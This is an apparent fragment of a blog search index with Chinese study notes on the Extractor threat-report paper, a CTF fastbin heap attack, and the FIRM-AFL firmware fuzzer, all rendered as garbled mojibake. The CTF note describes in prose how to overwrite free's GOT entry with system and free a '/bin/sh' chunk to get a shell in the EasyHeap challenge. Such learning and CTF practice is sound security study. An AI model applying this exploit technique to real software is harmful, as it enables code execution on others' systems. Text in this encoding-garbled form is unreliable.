¸å¿ƒç»„ä»¶ä¹‹ä¸€ã€‚å®ƒè´Ÿè´£å¤§å¤§é™ä½æ–‡æœ¬çš„å¤æ‚æ€§å’Œæ•°é‡ï¼ŒåŒæ—¶ä¿ç•™æè¿°å¯è§‚å¯Ÿè¡Œä¸ºçš„æœ€é‡è¦çš„å¥å­ã€‚ æœ€åè¾“å‡ºçš„æ–‡æœ¬å½¢å¼æ˜¯ï¼šç³»ç»Ÿä¸»ä½“ (ä¾‹å¦‚ï¼Œè¿›ç¨‹)ã€å¯¹è±¡ (ä¾‹å¦‚ï¼Œæ–‡ä»¶ã€å¥—æ¥å­—)å’Œæ“ä½œ (ä¾‹å¦‚ï¼Œæ‰§è¡Œ)ã€‚æ–‡æœ¬æ˜¯æ˜ç¡®çš„ã€æœ‰åºçš„ï¼Œå¹¶ä¸”å¤§éƒ¨åˆ†å¤šä½™çš„æ–‡æœ¬è¢«æ¶ˆé™¤äº†\ngraph extraction ä½†æ˜¯åªæ˜¯ç®€å•çš„å°†ä¸»è¯­å’Œå¯¹è±¡è®¾ç½®ä¸ºå›¾ä¸­ç»“ç‚¹ï¼ŒåŠ¨è¯è®¾ç½®ä¸ºå›¾ä¸­çš„è¾¹ç”Ÿæˆçš„å›¾æ¨¡ç³Šä¸”å·¨å¤§ã€‚\nSemantic Role Labeling SRL SRL å¯ä»¥ä»å¥å­ä¸­æå–è§’è‰²ï¼Œå¹¶ä¸”ç†è§£å“ªä¸ªæ˜¯åŠ¨ä½œå®æ–½è€…ï¼Œå“ªä¸ªæ˜¯æ¥å—è€…ã€‚\nç³»ç»Ÿå®ä½“æå–å™¨ (SEE) SEE æ¨¡å—ï¼Œä» SRL ç”Ÿæˆçš„è§’è‰²ä¸­æå–ä»£è¡¨ç³»ç»Ÿå®ä½“çš„ç®€æ´èŠ‚ç‚¹ï¼Œå¹¶ä¿®å‰ªæ‰ä¸èƒ½æ„æˆå¯èƒ½çš„ç³»ç»Ÿå®ä½“çš„æ— ç”¨éƒ¨åˆ†ã€‚ SEE ä½¿ç”¨è¶…è¿‡ 32 ç§ä¸åŒçš„æ­£åˆ™è¡¨è¾¾å¼å’Œåº”ç”¨ç¨‹åºåç§°æˆ–çŸ¥åè¿›ç¨‹çš„æ•°æ®åº“æ£€æµ‹å¯èƒ½çš„ç³»ç»Ÿå®ä½“åç§° (ä¾‹å¦‚ï¼Œæ–‡ä»¶æˆ–è¿›ç¨‹åç§°ï¼ŒIPï¼Œæ³¨å†Œè¡¨é¡¹)ã€‚\ngraph builder GB åˆ†ä¸¤ä¸ªæ­¥éª¤ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯æ ¹æ® see ä¿®å‰ªåå‰©ä¸‹çš„æ–‡æœ¬ï¼Œå°†ä¸»è¯­ä½œä¸ºç»“ç‚¹ï¼ŒåŠ¨ä½œä½œä¸ºè¾¹æ„å»ºå›¾ã€‚ ç¬¬äºŒæ­¥å°±æ˜¯åŸºäºå› æœæ¨è®ºæ¥ç¡®å®šè¾¹çš„æ–¹å‘ã€‚\nå› æœæ¨è®º Causal Inference è¿™æ­¥ç”¨äºç¡®å®šå›¾ä¸­è¾¹çš„æ–¹å‘ã€‚æ ¹æ®ç³»ç»Ÿè°ƒç”¨åˆ°ç³»ç»Ÿæµæ–¹å‘çš„æ˜ å°„ã€‚å•¥æ„æ€ï¼Œå°±æ˜¯çœ‹è¿™ä¸ªç³»ç»Ÿè°ƒç”¨æ˜¯å¹²å˜›çš„ï¼Œæ¯”å¦‚å¯¹äºå‘é€ç³»ç»Ÿè°ƒç”¨ï¼Œæµä»ä¸»è¯­åˆ°å¯¹è±¡ï¼Œè€Œå¯¹äºæ¥æ”¶ç³»ç»Ÿè°ƒç”¨ï¼Œæµä»å¯¹è±¡åˆ°ä¸»è¯­ã€‚\n4. IMPLEMENTATION Tokenization å»ºç«‹åœ¨ NLTK å¥å­æ ‡è®°å™¨ä¹‹ä¸Šã€‚NLTK (è‡ªç„¶è¯­è¨€å·¥å…·åŒ…)æ˜¯ä¸€ä¸ªå¸¸è§çš„è‡ªç„¶è¯­è¨€å¤„ç†å·¥å…·åŒ…ï¼ŒåŒ…å«ä¸ºè‹±è¯­å¼€å‘çš„å‡ ä¸ªåº“å’Œç»Ÿè®¡è‡ªç„¶è¯­è¨€å¤„ç†ã€‚æˆ‘ä»¬é€‰æ‹© NLTK æ˜¯å› ä¸ºæˆ‘ä»¬å‘ç°å®ƒæ¯”å…¶ä»–æ–¹æ³• (spaCy, Stanford)æ•ˆæœæ›´å¥½ï¼Œå¹¶ä¸”åœ¨å¤„ç† CTI åŸŸä¸­çš„æ–‡æœ¬æ—¶æ›´åŠ ä¸€è‡´ã€‚\nText Summarization ä½¿ç”¨äº†ä¸€ä¸ª12 ä¸ªéšè—å±‚ BERT æ¥åŒºåˆ†ç”Ÿäº§æ€§å¥å­å’Œéç”Ÿäº§æ€§å¥å­ã€‚ä½¿ç”¨äº†8000ä¸ªæ ‡è®°å¥å­ï¼Œè®­ç»ƒæ¨¡å‹ã€‚ ä¸ºäº†ç†è§£å•è¯åœ¨æ–‡æœ¬æ‘˜è¦å™¨ä¸­çš„è§’è‰²ï¼Œä½¿ç”¨äº†ä¸€ä¸ªæ·±åº¦ BiLSTM æ¨¡å‹çš„é‡æ–°å®ç°ã€‚ç”±äºæ¨¡å‹æ²¡æœ‰ç»è¿‡å¾®è°ƒä»¥å¤„ç†ç½‘ç»œå®‰å…¨å¥å­ï¼Œæˆ‘ä»¬ä½¿ç”¨3,000ä¸ªæ‰‹åŠ¨æ ‡è®°çš„å¥å­æ¥è®­ç»ƒæ¨¡å‹ã€‚\nSRL ä¸ºäº†å®ç° SRLï¼Œæˆ‘ä»¬ä½¿ç”¨äº†[79]ä¸­æè¿°çš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”±[34]éƒ¨ç½²ï¼Œè¯¥æ–¹æ³•åœ¨ NLP é¢†åŸŸè¶Šæ¥è¶Šæµè¡Œã€‚ä¸ºäº†é‡‡ç”¨è¯¥ç³»ç»Ÿå¹¶åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸè·å¾—æ›´ç²¾ç¡®çš„è¾“å‡ºï¼Œæˆ‘ä»¬è¿›ä¸€æ­¥ç”¨2000ä¸ªç½‘ç»œå®‰å…¨å¥å­é‡æ–°è®­ç»ƒæ¨¡å‹ï¼Œè¿™äº›å¥å­ä¸æˆ‘ä»¬æ³¨æ„åˆ°ç³»ç»Ÿæ— æ³•æ­£ç¡®é¢„æµ‹è§’è‰²çš„é¢†åŸŸç›¸å…³ã€‚ä¸ºäº†è¿›ä¸€æ­¥å®Œå–„ï¼Œæˆ‘ä»¬è¯„ä¼°å¹¶å±•ç¤ºäº†æˆ‘ä»¬å†åŸ¹è®­çš„ç»“æœ (è§ç« èŠ‚ V-D)ã€‚\næ•°æ®æ„å»º ä¸ºäº†æ„å»ºå­—å…¸å’Œæˆ‘ä»¬çš„æ•°æ®é›†ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä»å„ç§æ¥æºæŠ“å–çš„ CTI æŠ¥å‘Šæ± ã€‚æˆ‘ä»¬ä½¿ç”¨äº†ä¸åŒçš„æ¥æºï¼Œå³ APT æŠ¥å‘Šå­˜å‚¨åº“[6]ã€å¾®è½¯å¨èƒä¸­å¿ƒ[8]ã€èµ›é—¨é“å…‹å®‰å…¨ä¸­å¿ƒ[16]ã€å¨èƒç™¾ç§‘å…¨ä¹¦[18]å’Œç—…æ¯’é›·è¾¾[20]ï¼Œä»¥ç¡®ä¿å¤šæ ·æ€§å’Œè¦†ç›–èŒƒå›´ã€‚\næ³¨æ„ å…ˆå‰çš„ç ”ç©¶[52]ï¼Œ[45]ï¼Œ[89]åˆ©ç”¨å„ç§ NLP æŠ€æœ¯ä»¥ IOCs (å³[52]ï¼Œ[89])å’Œå¨èƒè¡ŒåŠ¨ (å³[45])çš„å½¢å¼è‡ªåŠ¨æå– CTI æŠ¥å‘Šä¸­å¯ç”¨çš„çŸ¥è¯†ã€‚\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/extractor_-extracting-attack-behavior-from-threat-reports/","summary":"ä¸­æ–‡è¯‘åï¼šæå–å™¨: ä»å¨èƒæŠ¥è¡¨ä¸­æå–æ”»å‡»è¡Œä¸º ä½œè€…ï¼šKiavash Satvat å•ä½ï¼šä¼Šåˆ©è¯ºä¼Šå¤§å­¦èŠåŠ å“¥åˆ†æ ¡ å›½å®¶ï¼š #ç¾å›½ å¹´ä»½ï¼š #2021å¹´ æ¥æºï¼š #SP å…³é”®å­—ï¼š #","title":"Extractor_ Extracting Attack Behavior from Threat Reports"},{"content":"(72æ¡æ¶ˆæ¯) å †æ¼æ´æŒ–æ˜â€”â€”fastbin attackæ¼æ´_è‘£å“¥çš„é»‘æ¿æŠ¥çš„åšå®¢-CSDNåšå®¢ fastbin attackæ€»ä½“ä¸Šæ¥è¯´å°±æ˜¯å»ä¿®æ”¹æŒ‚åœ¨fastbinä¸Šfree chunkçš„fdæŒ‡é’ˆã€‚æ¯”å¦‚ç°åœ¨fastbinä¸ŠæŒ‚ç€ä¸€ä¸ªfreeçš„chunk aï¼Œå®ƒçš„fdæŒ‡é’ˆä¸º0ã€‚å› ä¸ºæ²¡æœ‰åˆ«çš„free chunkäº†ã€‚æˆ‘ä»¬ä¿®æ”¹äº†è¿™fdæŒ‡é’ˆï¼ŒæŒ‡å‘äº†ä¸€ä¸ªæˆ‘ä»¬æƒ³ç¼–è¾‘çš„åŒºåŸŸï¼Œè¿™æ ·ç›¸å½“äºæ˜¯è®©ç³»ç»Ÿè¯¯ä»¥ä¸ºåœ¨a chunkåè¿˜æœ‰ä¸€ä¸ªfree chunkã€‚æˆ‘ä»¬é€šè¿‡ä¸¤æ¬¡mallocå°±å¯ä»¥å¾—åˆ°fake chunkçš„æŒ‡é’ˆï¼Œä»è€Œå®ç°ç¼–è¾‘è¯¥åŒºåŸŸã€‚ ä½†æ˜¯ä¼ªé€ fake chunkéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼Œsizeå¤§å°åˆé€‚ï¼Œå¹¶ä¸”PREV_INUSEä¸º1ã€‚ ç”±äºç³»ç»Ÿä¸­0x7fè¿™æ ·çš„æ•°å€¼æ¯”è¾ƒå¥½æ‰¾ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç›®æ ‡åŒºåŸŸå‘¨å›´æ‰¾ä¸€æ‰¾æœ‰æ²¡æœ‰0x7fï¼Œç„¶åè®©fake chunkçš„sizeå­—æ®µä½äºè¿™ä¸ª0x7fåŒºåŸŸï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡æ£€æŸ¥ã€‚ é‚£å¦‚æœæ‰¾ä¸åˆ°0x7få‘¢ã€‚éœ€è¦ [[unsortedbin attack]]\ndouble free (72æ¡æ¶ˆæ¯) å¥½å¥½è¯´è¯ä¹‹Fastbin Attackï¼ˆ1ï¼‰ï¼šFastbin Double Free_hollkçš„åšå®¢-CSDNåšå®¢\nhouse of spirit (72æ¡æ¶ˆæ¯) å¥½å¥½è¯´è¯ä¹‹Fastbin Attackï¼ˆ2ï¼‰ï¼šHouse Of Spirit_hollkçš„åšå®¢-CSDNåšå®¢ ç›´æ¥çœ‹ä¾‹é¢˜å¥½ç†è§£ä¸€ç‚¹ [ZJCTF 2019]EasyHeap æ¼æ´ç‚¹å‡ºåœ¨edit_heapå‡½æ•°ï¼Œå®ƒæ²¡æœ‰å¯¹å†™å…¥çš„sizeè¿›è¡Œé™åˆ¶ã€‚ ï¼ˆbtwï¼Œsystemå‡½æ•°çš„cat flagæ˜¯å‡çš„ï¼‰ è¿™é“é¢˜å¯ä»¥ä¿®æ”¹gotè¡¨ï¼Œæˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯ä¿®æ”¹æŸä¸ªå‡½æ•°çš„gotè¡¨ï¼Œç„¶åå½“è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œè°ƒç”¨äº†systemå‡½æ•°ã€‚ æ¯”å¦‚æˆ‘ä»¬å°†freeå‡½æ•°çš„gotè¡¨å†™æˆsystemå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬è°ƒç”¨free (\u0026quot;/bin/sh\u0026quot;) å°±æ˜¯system (\u0026quot;/bin/sh\u0026quot;) freeå‡½æ•°çš„gotåœ°å€å¯ä»¥é€šè¿‡elf. got[\u0026lsquo;free\u0026rsquo;]å¾—åˆ°ã€‚åŒæ ·çš„systemåœ°å€ä¹Ÿå¯ä»¥å¾—åˆ° é‚£ä¹ˆå¦‚ä½•ä¿®æ”¹freeçš„gotå‘¢ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ ä¸€ä¸ªæŒ‡å‘free gotçš„fake chunkï¼Œç„¶åå°†è¯¥fake chunkç”³è¯·ä¸‹æ¥ï¼Œå°±èƒ½ä¿®æ”¹free gotçš„å€¼ æ€è·¯ï¼š æˆ‘ä»¬ç”³è¯·ä¸¤ä¸ªchunk aå’Œbï¼Œå°†b freeï¼Œç„¶åé€šè¿‡aæº¢å‡ºä¿®æ”¹bï¼Œå°†bçš„fbæŒ‡å‘ç›®æ ‡åœ°å€ï¼ˆå°±æ˜¯gotï¼‰ï¼Œè¿™é‡Œè¦æ³¨æ„è¦æ‰¾ä¸ªæœ‰0x7fçš„åœ°æ–¹ã€‚ç„¶åå°†bç”³è¯·å›æ¥ï¼Œç„¶åå†ç”³è¯·ä¸€ä¸ª0x60å¤§å°çš„chunkå°±æ‹¿åˆ°äº†æˆ‘ä»¬çš„fake chunkï¼Œä¿®æ”¹fake chunkå°±æŠŠfreeçš„gotæ”¹æˆsystemäº†ã€‚ ç„¶åæˆ‘ä»¬ç”³è¯·ä¸€ä¸ªchunkï¼Œchunkå†…å®¹æ˜¯\u0026quot;/bin/sh\u0026quot;ï¼Œç„¶åé‡Šæ”¾è¿™ä¸ªchunkï¼Œå°±okäº†ã€‚ free (heaparray[n]) == system (heaparray[n]) == system (\u0026quot;/bin/sh\u0026quot;)\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/fastbin-attack/","summary":"(72æ¡æ¶ˆæ¯) å †æ¼æ´æŒ–æ˜â€”â€”fastbin attackæ¼æ´_è‘£å“¥çš„é»‘æ¿æŠ¥çš„åšå®¢-CSDNåšå®¢ fastbin attackæ€»ä½“ä¸Šæ¥è¯´å°±æ˜¯å»ä¿®æ”¹æŒ‚åœ¨fastb","title":"fastbin attack"},{"content":"ä¸­æ–‡è¯‘åï¼šFIRM-AFLï¼šé€šè¿‡å¢å¼ºè¿‡ç¨‹ä»¿çœŸå®ç°çš„ç‰©è”ç½‘å›ºä»¶çš„é«˜é€šé‡ç°ç›’æ¨¡ç³Šæµ‹è¯• ä½œè€…ï¼šéƒ‘ yaowen å•ä½ï¼šä¸­å›½ç§‘å­¦é™¢ä¿¡æ¯å·¥ç¨‹ç ”ç©¶æ‰€åŒ—äº¬ç‰©è”ç½‘é‡ç‚¹å®éªŒå®¤ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2019å¹´ æ¥æºï¼š #USENIXä¼šè®® å…³é”®å­—ï¼š #åµŒå…¥å¼ #fuzzing ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-02-07 09:13\nä½œè€…é¢˜ç›®ä¸­æåˆ°çš„é«˜é€šé‡åœ¨æ–‡ç« ä½“ç°ä¸ºä»¿çœŸå™¨çš„é«˜ååé‡ã€‚ä»€ä¹ˆæ„æ€å‘¢ï¼Œå°±æ˜¯è¯´å›ºä»¶éœ€è¦ä»¿çœŸè¿è¡Œåœ¨ä»¿çœŸå™¨ä¸­ï¼Œæ¨¡ç³Šæµ‹è¯•å–‚ç»™å›ºä»¶å¤§é‡æµ‹è¯•ç”¨ä¾‹ï¼Œä½†æ˜¯ç›®å‰çš„ä»¿çœŸæ‰‹æ®µå¯¹äºå–‚ç»™çš„æµ‹è¯•ç”¨ä¾‹æ‰§è¡Œçš„å¾ˆæ…¢ï¼Œ1 ç§’å¯èƒ½åªæ‰§è¡Œ 1 ä¸ªæˆ–å‡ ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œå³ååé‡å°ï¼Œä½œè€…å®ç°çš„ FIRM-AFL ååé‡å¾ˆé«˜ã€‚\næ‘˜è¦ FIRM-AFL æ˜¯ç¬¬ä¸€ä¸ªé’ˆå¯¹ç‰©è”ç½‘å›ºä»¶çš„é«˜é€šé‡çš„ç°ç›’æ¨¡ç³Šæµ‹è¯•å™¨ è§£å†³äº†å…¼å®¹æ€§é—®é¢˜â€”â€”å¯¹å¯ä»¥åœ¨ç³»ç»Ÿä»¿çœŸå™¨ä»¿çœŸçš„ POSIX å…¼å®¹å›ºä»¶è¿›è¡Œæ¨¡ç³Šæµ‹è¯• è§£å†³äº†æ€§èƒ½ç“¶é¢ˆâ€”â€”å¢å¼ºè¿›ç¨‹æ¨¡æ‹Ÿçš„æ–°æŠ€æœ¯ å¢å¼ºå‹è¿›ç¨‹ä»¿çœŸä»¥ä¸€ç§æ–°é¢–çš„æ–¹å¼å°†ç³»ç»Ÿæ¨¡å¼ä»¿çœŸå’Œç”¨æˆ·æ¨¡å¼ä»¿çœŸç»“åˆèµ·æ¥ï¼Œæä¾›äº†ç³»ç»Ÿæ¨¡å¼ä»¿çœŸçš„é«˜å…¼å®¹æ€§å’Œç”¨æˆ·æ¨¡å¼ä»¿çœŸçš„é«˜ååé‡ã€‚ çœ‹æ¥æœ¬ç¯‡æ–‡ç« çš„ä¸»è¦å·¥ä½œåœ¨äºè¿™ä¸ªå¢å¼ºè¿›ç¨‹ä»¿çœŸæŠ€æœ¯ å¼•è¨€ ååé‡æ˜¯å½±å“æ¨¡ç³Šæ•ˆæœçš„å…³é”®å› ç´ ã€‚æ ¹æ®æ–‡ç« çš„å®éªŒï¼Œå…¨ç³»ç»Ÿä»¿çœŸæ¯”ç”¨æˆ·æ¨¡å¼ä»¿çœŸ (AFL ä½¿ç”¨çš„ç”¨æˆ·æ¨¡å¼ä»¿çœŸ) æ…¢å¤§çº¦ 10 å€ã€‚10 å€çš„å‡é€Ÿæ„å‘³ç€åœ¨ç‰©è”ç½‘ç¨‹åºä¸­æŸ¥æ‰¾æ¼æ´æ‰€éœ€çš„è®¡ç®—èµ„æºå¤§çº¦æ˜¯æ¡Œé¢ç¨‹åºçš„ 10 å€ã€‚ å…¨ç³»ç»Ÿä»¿çœŸçš„å·¨å¤§è¿è¡Œæ—¶å¼€é”€çš„ä¸€éƒ¨åˆ†æ¥è‡ªå†…å­˜ç®¡ç†å•å…ƒ (å³ SoftMMU) çš„è½¯ä»¶å®ç°ï¼Œç”¨äºå°†è™šæ‹Ÿæœºä¸­å‘ç”Ÿçš„æ¯ä¸€æ¬¡å†…å­˜è®¿é—®çš„å®¢æˆ·è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºä¸»æœºè™šæ‹Ÿåœ°å€ã€‚å¼€é”€çš„å¦ä¸€éƒ¨åˆ†æ¥è‡ªç³»ç»Ÿè°ƒç”¨æ¨¡æ‹Ÿå¼€é”€ã€‚ æˆ‘ä»¬çš„è§£å†³æ–¹æ¡ˆï¼šé€šè¿‡å¢å¼ºè¿‡ç¨‹ä»¿çœŸè¿›è¡Œç°ç›’æ¨¡ç³Šæµ‹è¯•ã€‚ ä¼˜åŠ¿åœ¨äºé€æ˜åº¦å’Œæ•ˆç‡ é€æ˜åº¦ï¼Œå³ä¸éœ€è¦å¯¹å›ºä»¶ä¸­çš„ç¨‹åºè¿›è¡Œä¿®æ”¹ï¼Œ æ•ˆç‡ï¼Œå³æ•´ä¸ªç³»ç»Ÿçš„æ¨¡ç³Šååé‡åº”è¯¥æ¥è¿‘ç”¨æˆ·æ¨¡å¼ä»¿çœŸã€‚ å…³é”®åœ¨äºå°†å…¨ç³»ç»Ÿä»¿çœŸå’Œç”¨æˆ·æ¨¡å¼ä»¿çœŸç›¸ç»“åˆï¼Œå¾—åˆ°äº†å…¨ç³»ç»Ÿä»¿çœŸçš„é€šç”¨æ€§å’Œç”¨æˆ·æ¨¡å¼ä»¿çœŸçš„æ•ˆç‡ã€‚ ä¸»è¦æ˜¯é€šè¿‡ç³»ç»Ÿä»¿çœŸæ¥åŠ å¼ºè¿›ç¨‹ï¼ˆæˆ–è€…è¯´ç”¨æˆ·æ¨¡å¼ï¼‰çš„ä»¿çœŸã€‚å…·ä½“æ¥è¯´æ˜¯è¢«æµ‹ç¨‹åºä¸»è¦è¿è¡Œåœ¨ç”¨æˆ·æ€çš„ä»¿çœŸä»¥è¾¾åˆ°é«˜æ•ˆçš„ç›®çš„ï¼Œåªæœ‰åœ¨å¿…è¦æ—¶åˆ‡æ¢åˆ°å…¨ç³»ç»Ÿä»¿çœŸï¼Œä»¥ä¿è¯ç¨‹åºçš„æ­£ç¡®æ‰§è¡Œï¼Œä»è€Œå®ç°é€šç”¨æ€§ã€‚ FIRM-AFL åŸºäº AFL å’Œ Firmadyne å®ç°ï¼ŒAFL è´Ÿè´£è¦†ç›–å¼•å¯¼æ¨¡ç³Šæµ‹è¯•ï¼ŒFirmadyne è´Ÿè´£ä»¿çœŸå’Œå…¨ç³»ç»Ÿä»¿çœŸä¸ç”¨æˆ·æ€ä»¿çœŸä¹‹é—´çš„åˆ‡æ¢ èƒŒæ™¯å’ŒåŠ¨æœº Fuzzing å’Œ qemu è·³è¿‡ï¼Œæ²¡å•¥æ„æ€\næµ‹è¯•ç‰©è”ç½‘å›ºä»¶ æŒ‘æˆ˜ å…¼å®¹æ€§ ä»£ç è¦†ç›–ç‡ï¼šé»‘ç›’æ¨¡ç³Šå™¨çš„ä»£ç è¦†ç›–ç‡å¾ˆä½ï¼Œè€Œç™½ç›’æ¨¡ç³Šå™¨ä¸èƒ½æ‰©å±•åˆ°ç•¥å¤§çš„ä»£ç åº“ åŒç±»å‹å·¥å…·å¯¹æ¯” Avatarï¼šåè°ƒæ¨¡æ‹Ÿå™¨å’Œç‰©ç†ç¡¬ä»¶ï¼ŒAvatar å……å½“æ¨¡æ‹Ÿå™¨å’Œå®é™…ç¡¬ä»¶ä¹‹é—´çš„è½¯ä»¶ä»£ç†ã€‚ ç”±äºæ¶‰åŠåˆ°ç™½ç›’æ¨¡ç³Šå’Œç¼“æ…¢çš„ç¡¬ä»¶ï¼ŒAvatar çš„ååé‡é¢„è®¡ä¼šå¾ˆä½ã€‚ IoTFuzzerï¼šç›´æ¥å¯¹è®¾å¤‡è¿›è¡Œé»‘ç›’æµ‹è¯•ï¼Œå®ƒçš„ä¸»è¦ä¼˜ç‚¹æ˜¯é€šè¿‡ç›®æ ‡è®¾å¤‡çš„é…å¥—ç§»åŠ¨åº”ç”¨ç¨‹åºæ‰§è¡Œæ¨¡ç³Šã€‚ IoTFuzzer ä»æœªè¶…è¿‡æ¯ç§’ 1 ä¸ªæµ‹è¯•ç”¨ä¾‹çš„ååé‡ï¼Œè¿™æ˜¯ç¼“æ…¢çš„ Firmadyneï¼šåœ¨ç³»ç»Ÿæ¨¡å¼ QEMU ä¸­å¢åŠ äº†å¯¹ IoT å›ºä»¶çš„ç¡¬ä»¶æ”¯æŒï¼Œé€šè¿‡ä¿®æ”¹å†…æ ¸å’Œé©±åŠ¨ç¨‹åºæ¥å®Œå…¨æ¨¡æ‹Ÿç³»ç»Ÿï¼Œä»¥å¤„ç†ç”±äºç¼ºä¹å®é™…ç¡¬ä»¶è€Œå¯¼è‡´çš„ç‰©è”ç½‘å¼‚å¸¸ã€‚æ›´å®¹æ˜“é€‚åº”æ–°çš„ IOT å›ºä»¶ã€‚ å…¨ç³»ç»Ÿæ¨¡æ‹Ÿçš„ååé‡é€šå¸¸æ¯”æœ¬æœºæ‰§è¡Œï¼ˆæœ¬æœºæ‰§è¡Œæ˜¯æŒ‡ç›´æ¥å‘ç¡¬ä»¶å‘é€è¾“å…¥ï¼‰å¥½ AFLï¼šAFL å¯ä»¥é€šè¿‡ qemu è¿›è¡ŒäºŒè¿›åˆ¶æ¨¡ç³Šï¼Œä½†æ˜¯æ— æ³•æˆåŠŸæ¨¡æ‹Ÿå¤§å¤šæ•°ç‰©è”ç½‘ç¨‹åºã€‚ Muench ç­‰äºº[28]çš„ç ”ç©¶è¡¨ç¤ºç›¸æ¯”è¾ƒäºéƒ¨åˆ†ä»¿çœŸå’Œæœ¬æœºæ‰§è¡Œï¼Œå®Œå…¨ä»¿çœŸæ‹¥æœ‰æœ€å¤§çš„ååé‡ã€‚ å› ä¸ºç‰©è”ç½‘è®¾å¤‡å¤„ç†å™¨è¦æ¯”æ¡Œé¢çº§å¤„ç†å™¨æ…¢çš„å¤šï¼Œæ‰€ä»¥ä½ ä¸€æ—¦æ¶‰åŠåˆ°çœŸå®ç¡¬ä»¶ï¼Œé€Ÿåº¦å°±ä¼šè¢«ç‰©è”ç½‘è®¾å¤‡å¤„ç†å™¨æ‹–æ…¢ï¼Œæ‰€ä»¥åŸºäºæ¡Œé¢çº§å¤„ç†å™¨çš„å…¨ä»¿çœŸè¦å¿«å¾—å¤š ä½œè€…åœ¨è¿™é‡Œçš„è¯„ä»·æ ‡å‡†èšç„¦äºååé‡ï¼Œä¸å¤ªæ˜ç™½è¿™ä¸ªååé‡æ˜¯å•¥ï¼Œåº”è¯¥å°±æ˜¯æŒ‡è®¾å¤‡æ¥æ”¶æµ‹è¯•ç”¨ä¾‹çš„é€Ÿåº¦å§ åŠ¨æœº å›ºä»¶å¤§å¤šæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒåŸºäºä»¿çœŸæ˜¯æœ€ä½³çš„ å®Œå…¨ä»¿çœŸååé‡è¦é«˜äºå…¶ä»–ä»¿çœŸæ–¹æ³• ååé‡çš„ç“¶é¢ˆæ‰€åœ¨ï¼š\nå†…å­˜åœ°å€è½¬æ¢ï¼šå…¨ç³»ç»Ÿä»¿çœŸä¸­çš„å†…å­˜åœ°å€è½¬æ¢è¦æ¯”ç”¨æˆ·æ¨¡å¼ä»¿çœŸä¸­çš„å¤æ‚ï¼Œè€—æ—¶ä¹… åŠ¨æ€ä»£ç è½¬æ¢ã€‚å—é“¾æ¥ä»…é™äºåŒä¸€ç‰©ç†é¡µé¢ä¸­çš„åŸºæœ¬å—ï¼Œè¿™æ„å‘³ç€å…¨ç³»ç»Ÿä»¿çœŸæ¯”åœ¨ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿä¸­æ›´é¢‘ç¹åœ°è°ƒç”¨è½¬æ¢å™¨ ç³»ç»Ÿè°ƒç”¨ä»¿çœŸï¼šç”¨æˆ·æ¨¡å¼ä»¿çœŸä¸­ï¼Œç³»ç»Ÿè°ƒç”¨äº¤ç»™ä¸»æœºæ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶ï¼›ä½†æ˜¯åœ¨å…¨ç³»ç»Ÿä»¿çœŸä¸­ï¼Œç³»ç»Ÿè°ƒç”¨äº¤ç»™æ¨¡æ‹Ÿçš„æ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶ï¼Œé€Ÿåº¦è¾ƒæ…¢ï¼Œå¹¶ä¸”å…¶å®ä¸æ˜¯æ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨éƒ½éœ€è¦ä»¿çœŸçš„æ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶æ¥æ”¯æŒã€‚ å¢å¼ºè¿›ç¨‹ä»¿çœŸ æ¦‚è¿° æŒ‘æˆ˜ï¼šå…¼å®¹æ€§å’Œæ€§èƒ½ã€‚ç¬¬ä¸€ä¸ªæŒ‘æˆ˜å¯ä»¥é€šè¿‡å…¨ç³»ç»Ÿä»¿çœŸæ¥è§£å†³ï¼Œä½†è¿™ä¼šå¯¼è‡´è¾ƒå·®çš„æ€§èƒ½ã€‚ç¬¬äºŒä¸ªæŒ‘æˆ˜å¯ä»¥é€šè¿‡ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿè§£å†³ï¼Œä½†ä¼šå¯¼è‡´å…¼å®¹æ€§è¾ƒå·®ã€‚ å‰æï¼š\nå›ºä»¶å¯ä»¥åœ¨ç³»ç»Ÿæ¨¡æ‹Ÿå™¨ä¸­æ­£ç¡®åœ°ä»¿çœŸ (ä¾‹å¦‚ï¼Œç³»ç»Ÿæ¨¡å¼ QEMU)ï¼šåœ¨ Firmadyne[13]çš„å¸®åŠ©ä¸‹ï¼Œå¤§éƒ¨åˆ† IoT å›ºä»¶æ˜ åƒéƒ½èƒ½å¤Ÿæ»¡è¶³è¿™ä¸€è¦æ±‚ã€‚ å›ºä»¶æ”¯æŒ posix å…¼å®¹çš„æ“ä½œç³»ç»Ÿï¼šè®¸å¤š IoT å›ºä»¶æ˜ åƒä½¿ç”¨ Linux ä½œä¸ºæ“ä½œç³»ç»Ÿï¼Œå› æ­¤æ»¡è¶³äº†è¿™ä¸€éœ€æ±‚ã€‚ ç›®æ ‡ï¼ˆå¯¹åº”äº†æŒ‘æˆ˜çš„ä¸¤ç‚¹ï¼‰ï¼š\né€æ˜åº¦ï¼šåœ¨å¢å¼ºè¿›ç¨‹æ¨¡æ‹Ÿä¸­è¿è¡Œçš„ç”¨æˆ·çº§ç¨‹åºçš„è¡Œä¸ºåº”è¯¥ä¸åœ¨ç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿä¸­è¿è¡Œä¸€æ ·ã€‚ 